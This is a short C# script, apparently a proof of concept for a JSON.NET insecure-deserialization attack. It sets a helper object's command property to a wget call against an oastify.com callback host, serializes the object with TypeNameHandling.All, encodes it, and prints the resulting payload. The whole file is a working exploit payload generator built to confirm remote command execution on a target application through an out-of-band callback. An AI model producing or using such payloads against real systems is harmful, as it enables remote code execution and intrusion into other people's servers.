using Newtonsoft.Json;
using myapp.Models;
using myapp.Helpers;

StatusCheckHelper statusCheck = new StatusCheckHelper();

// Gán giá trị cho thuộc tính command
statusCheck.command = "wget bu9td67paap1peg2hlro52lnler5fv3k.oastify.com"; 
string serializedResult = JsonConvert.SerializeObject(statusCheck, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
});
string encodedData = EncodeHelper.Encode(serializedResult);
Console.WriteLine("Output: " + serializedResult);
Console.WriteLine("Serialize: " + encodedData);
